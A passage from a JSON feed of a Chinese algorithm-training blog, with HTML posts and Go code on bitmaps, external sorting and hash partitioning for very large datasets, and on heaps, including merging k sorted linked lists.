punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token comment\">// 寻找第一个为 false 的位置</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> size<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token operator\">!</span>bitArray<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> i</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token comment\">// 如果找不到不存在的整数，返回 - 1</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\tmissingNumber <span class=\"token operator\">:=</span> <span class=\"token function\">generateMissingNumber</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Missing number:\"</span><span class=\"token punctuation\">,</span> missingNumber<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"3-40-亿个数中找到出现两次的数\"><a class=\"anchor\" href=\"#3-40-亿个数中找到出现两次的数\">#</a> 3. 40 亿个数中找到出现两次的数</h3>\n<p>题目要求：32 位无符号整数的范围是 0～4 294 967 295，现在有 40 亿个无符号整数，可以使用最多 1GB 的内存，找出所有出现了两次的数。</p>\n<p>所有出现过两次的数字，所以我们可以用两个位去标识一个数出现的次数。</p>\n<p>可行性分析，占用空间为 <code>(2^32)/8/1000/1000*2 ≈ 1000MB  </code></p>\n<p>建立一个长度为 <code>(2^32)*2</code>  的数组，遍历所有数，<br />\n当遍历到第 1 次的时候，把 <code>bitArr[num*2+1]</code>  和  <code>bitArr[num*2]</code>  设置为  <code>01</code> <br />\n 当遍历到第 2 次的时候，把 <code>bitArr[num*2+1]</code>  和  <code>bitArr[num*2]</code>  设置为  <code>10</code> <br />\n 当遍历到第 3 次的时候，把 <code>bitArr[num*2+1]</code>  和  <code>bitArr[num*2]</code>  设置为  <code>11</code> <br />\n 之后无论遍历到多少次，就不做任何操作。</p>\n<p>所有数遍历完成了之后，重新遍历，如果发现 <code>bitArr[num*2+1]</code>  和  <code>bitArr[num*2]</code>   =  <code>10</code>  就是出现了两次</p>\n<h2 id=\"分块处理\"><a class=\"anchor\" href=\"#分块处理\">#</a> 分块处理</h2>\n<p>如果文件实在太大 ，无法在内存中放下，则需要考虑将大文件分成若干小块，先处理每个块，最后再逐步得到想要的结果，这种方式也叫做外部排序。这样需要遍历全部序列至少两次，是典型的用时间换空间的方法，</p>\n<h3 id=\"4-从40个亿中产生一个不存在的整数限制内存为10mb\"><a class=\"anchor\" href=\"#4-从40个亿中产生一个不存在的整数限制内存为10mb\">#</a> 4. 从 40 个亿中产生一个不存在的整数，限制内存为 10MB</h3>\n<p>可行性分析，没办法使用位图。</p>\n<p>40 亿个数需要 500MB，10MB 空间的话至少分成 50 块，一般都是按照 2 的整数倍来划分，所以我们划分成 64 块。</p>\n<p><code>(2^32)</code>  约 40 亿 平均分成 64 个区间，每个区间的数量为 <code>(2^26)</code>  个</p>\n<p>具体流程为：</p>\n<ol>\n<li>第一次遍历，创建一个长度为 64 的数组，用于统计区间 <code>i</code>  上的数有多少；<br />\n遍历到的数除以 <code>(2^26)</code>  得到对应的区间，之后对应的区间数组的统计值 + 1；<br />\n遍历完所有数之后，必然有某个区间的数字小于 <code>(2^26)</code>  。</li>\n<li>找到这个区间，假设这个区间为 <code>partNum</code> ，然后第二次遍历。申请长度为 <code>(2^26)</code>  的位数组。<br />\n遍历到的数除以 <code>(2^26)</code> ，只处理商为 <code>partNum</code>  的值， <code>num/(2^26)==partNum</code> <br />\n 遍历完所有数之后，在位数组内必然存在有个值没被设置为 1</li>\n</ol>\n<h3 id=\"5-用-2gb-内存在-20-亿个整数中找到出现次数最多的数\"><a class=\"anchor\" href=\"#5-用-2gb-内存在-20-亿个整数中找到出现次数最多的数\">#</a> 5. 用 2GB 内存在 20 亿个整数中找到出现次数最多的数</h3>\n<p>题目要求：有一个包含 20 亿个全是 32 位整数的大文件，在其中找到出现次数最多的数。<br />\n要求，内存限制为 2GB。</p>\n<p>可行性分析，直接读到内存里，使用哈希表。假设 哈希表的 key 是 32 位 int 占 4B 内存，哈希表的 value 是 32 位 int 占 4B 内存，一条不重复的记录占用 8B，如果哈希表的记录为 20 亿个，占用内存  <code>2000000000*8/1000/1000/1000 = 16GB</code></p>\n<p>所以我们需要把这 20 亿个数通过哈希函数分成不同的小文件。这边我们分成 16 个小文件。相同的数通过同一个哈希函数之后，都会落入相同的文件中。</p>\n<p>具体流程为：</p>\n<ol>\n<li>遍历 20 亿个数，根据哈希函数算出哈希值，然后对 16 取模，进入到不同的小文件中。</li>\n<li>找到每个小文件中出现最多的数，对这几个数进行对比，找到出现最多的数。</li>\n</ol>\n<h3 id=\"6-对20gb文件进行排序\"><a class=\"anchor\" href=\"#6-对20gb文件进行排序\">#</a> 6. 对 20GB 文件进行排序</h3>\n<p>题目要求：假设你有一个 20GB 的文件，每行一个字符串，请说明如何对这个文件进行排序？</p>\n<p>我们将文件划分成一些块，每块大小是 xMB，x 就是可用内存的大小，例如 1GB 一块，那我们就可以将文件分为 20 块。我们先对每块进行排序，然后再逐步合并。这时候我们可以使用两两归并，也可以使用堆排序策略将其逐步合并成一个。</p>\n<h3 id=\"7从100-亿个-url中查找的问题\"><a class=\"anchor\" href=\"#7从100-亿个-url中查找的问题\">#</a> 7. 从 100 亿个 URL 中查找的问题</h3>\n<p>题目要求：有一个包含 100 亿个 URL 的大文件，假设每个 URL 占用 64B，请找出其中所有重复的 URL。</p>\n<p>可行性分析，所有文件占用存储大小为 <code>10000000000*64/1000/1000/1000 = 640GB</code></p>\n<p>同上，我们需要大文件通过哈希函数拆分成小文件，然后再进行处理。</p>\n<p>比如拆成 128 个小文件，如果哈希函数足够优秀的话，每个文件约 5GB</p>\n<p>后续流程略</p>\n<h2 id=\"堆\"><a class=\"anchor\" href=\"#堆\">#</a> 堆</h2>\n<p>如果在超大数据中找第 K 大、第 K 小，K 个最大、K 个最小，则特别适合使用堆来做。</p>\n<p>而且将超大数据换成流数据也可以，而且几乎是唯一的方式，口诀就是 “查小用大堆，查大用小堆”</p>\n<h3 id=\"8-从100-亿个-url中找到出现次数-top-100的url\"><a class=\"anchor\" href=\"#8-从100-亿个-url中找到出现次数-top-100的url\">#</a> 8. 从 100 亿个 URL 中找到出现次数 Top 100 的 URL</h3>\n<p>同上，将大文件拆分成小文件之后。我们可以把不同的小文件的 top100 进行处理合并处理，直到合并完所有的 top100。</p>\n<p>合并方法使用小顶堆来实现，</p>\n<h3 id=\"9-从10亿数字中寻找最小的100万个数字\"><a class=\"anchor\" href=\"#9-从10亿数字中寻找最小的100万个数字\">#</a> 9. 从 10 亿数字中寻找最小的 100 万个数字</h3>\n<p>为前 100 万个数字创建一个大顶堆，最大元素位于堆顶。</p>\n<p>然后，遍历整个序列，只有比堆顶元素小的才允许插入堆中，并删除原堆的最大元素。</p>\n<p>之后继续遍历剩下的数字，最后剩下的就是最小的 100 万个。</p>\n",
            "tags": [
                "计算机科学",
                "算法训练2023",
                "数据结构",
                "算法"
            ]
        },
        {
            "id": "https://blog.twelveeee.top/2023/AlgorithmCamp2023/14_Heap/",
            "url": "https://blog.twelveeee.top/2023/AlgorithmCamp2023/14_Heap/",
            "title": "14-堆",
            "date_published": "2023-12-12T14:00:00.000Z",
            "content_html": "<h1 id=\"堆\"><a class=\"anchor\" href=\"#堆\">#</a> 堆</h1>\n<h2 id=\"概念与特征\"><a class=\"anchor\" href=\"#概念与特征\">#</a> 概念与特征</h2>\n<p>堆是将一组数据按照完全二叉树的存储顺序，将数据存储在一个一维数组中的结构。堆有两种结构，一种称为大顶堆，一种称为小顶堆</p>\n<p>小顶堆：任意节点的值均小于等于它的左右孩子，并且最小的值位于堆顶，即根节点处。</p>\n<p>大顶堆：任意节点的值均大于等于它的左右孩子，并且最大的值位于堆顶，即根节点处。</p>\n<p>有些地方也叫大根堆、小根堆，或者最大堆、最小堆都一个意思。</p>\n<p>优先队列：说到底还是一种队列，他的工作就是 poll ()/peek () 出队列中最大 / 最小的那个元素，所以叫带有优先级的队列。能够实现优先功能的策略不一定只有堆，例如二项堆、平衡树、线段树、C++ 里会用二进制分组的 vector 来实现一个优先队列。</p>\n<p>堆：堆是一个很大的概念 他并不一定是完全二叉树。我们之前用完全二叉树是因为这个很容易被数组储存，但是除了这种二叉堆之外，我们还有二项堆、斐波那契堆、这种堆就不属于二叉树。</p>\n<p>golang 堆可以借助  <code>container/heap</code>  去实现</p>\n<p>container 源码解析：<a href=\"https://blog.twelveeee.top/2023/Go/Lib/sort_and_container/#container\">https://blog.twelveeee.top/2023/Go/Lib/sort_and_container/#container</a></p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token string\">\"container/heap\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">type</span> IntHeap <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">*</span>IntHeap<span class=\"token punctuation\">)</span> <span class=\"token function\">Push</span><span class=\"token punctuation\">(</span>x <span class=\"token keyword\">interface</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token operator\">*</span>h <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">*</span>IntHeap<span class=\"token punctuation\">)</span> <span class=\"token function\">Pop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">interface</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tx <span class=\"token operator\">:=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token operator\">*</span>h <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">return</span> x</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">*</span>IntHeap<span class=\"token punctuation\">)</span> <span class=\"token function\">Len</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">*</span>IntHeap<span class=\"token punctuation\">)</span> <span class=\"token function\">Less</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> j <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">*</span>IntHeap<span class=\"token punctuation\">)</span> <span class=\"token function\">Swap</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> j <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">newIntHeap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span>IntHeap <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\th <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>IntHeap<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\theap<span class=\"token punctuation\">.</span><span class=\"token function\">Init</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t<span class=\"token keyword\">return</span> h</pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">TestGoHeap</span><span class=\"token punctuation\">(</span>t <span class=\"token operator\">*</span>testing<span class=\"token punctuation\">.</span>T<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\th <span class=\"token operator\">:=</span> <span class=\"token function\">newIntHeap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\theap<span class=\"token punctuation\">.</span><span class=\"token function\">Push</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\theap<span class=\"token punctuation\">.</span><span class=\"token function\">Push</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\theap<span class=\"token punctuation\">.</span><span class=\"token function\">Push</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\theap<span class=\"token punctuation\">.</span><span class=\"token function\">Push</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\theap<span class=\"token punctuation\">.</span><span class=\"token function\">Push</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">if</span> h<span class=\"token punctuation\">.</span><span class=\"token function\">Len</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">5</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\tt<span class=\"token punctuation\">.</span><span class=\"token function\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Heap.Len() != 5\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token keyword\">for</span> h<span class=\"token punctuation\">.</span><span class=\"token function\">Len</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\tt<span class=\"token punctuation\">.</span><span class=\"token function\">Log</span><span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">.</span><span class=\"token function\">Pop</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"普通算法题\"><a class=\"anchor\" href=\"#普通算法题\">#</a> 普通算法题</h2>\n<h3 id=\"1-合并-k-个升序链表\"><a class=\"anchor\" href=\"#1-合并-k-个升序链表\">#</a> 1. 合并 K 个升序链表</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9tZXJnZS1rLXNvcnRlZC1saXN0cy9kZXNjcmlwdGlvbi8=\">https://leetcode.cn/problems/merge-k-sorted-lists/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTRfSGVhcC9sZXZlbF8yL3RvcGljXzEuZ28=\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/14_Heap/level_2/topic_1.go</span></p>\n<blockquote>\n<p>给你一个链表数组，每个链表都已经按升序排列。</p>\n<p>请你将所有链表合并到一个升序链表中，返回合并后的链表。</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">mergeKLists</span><span class=\"token punctuation\">(</span>lists <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>ListNode<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span>ListNode <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\th <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>ListNodeHeap<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\theap<span class=\"token punctuation\">.</span><span class=\"token function\">Init</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> node <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> lists <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> node <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t\theap<span class=\"token punctuation\">.</span><span class=\"token function\">Push</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">,</span> node<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tdummyHead <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>ListNode<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\tcurr <span class=\"token operator\">:=</span> dummyHead</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\tnode <span class=\"token operator\">:=</span> heap<span class=\"token punctuation\">.</span><span class=\"token function\">Pop</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>ListNode<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> node<span class=\"token punctuation\">.</span>Next <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t\theap<span class=\"token punctuation\">.</span><span class=\"token function\">Push</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">,</span> node<span class=\"token punctuation\">.</span>Next<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\tcurr<span class=\"token punctuation\">.</span>Next <span class=\"token operator\">=</span> node</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\tcurr <span class=\"token operator\">=</span> curr<span class=\"token punctuation\">.</span>Next</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t<span class=\"token keyword\">return</span> dummyHead<span class=\"token punctuation\">.</span>Next</pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">type</span> ListNodeHeap <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>ListNode</pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">*</span>ListNodeHeap<span class=\"token punctuation\">)</span> <span class=\"token function\">Len</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span>           <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">return</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">*</span>ListNodeHeap<span class=\"token punctuation\">)</span> <span class=\"token function\">Less</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> j <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>Val <span class=\"token operator\">&lt;</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>Val <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">*</span>ListNodeHeap<span class=\"token punctuation\">)</span> <span class=\"token function\">Swap</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> j <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span>      <span class=\"token punctuation\">&#123;</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">*</span>ListNodeHeap<span class=\"token punctuation\">)</span> <span class=\"token function\">Push</span><span class=\"token punctuation\">(</span>val any<span class=\"token punctuation\">)</span>       <span class=\"token punctuation\">&#123;</span> <span class=\"token operator\">*</span>h <span 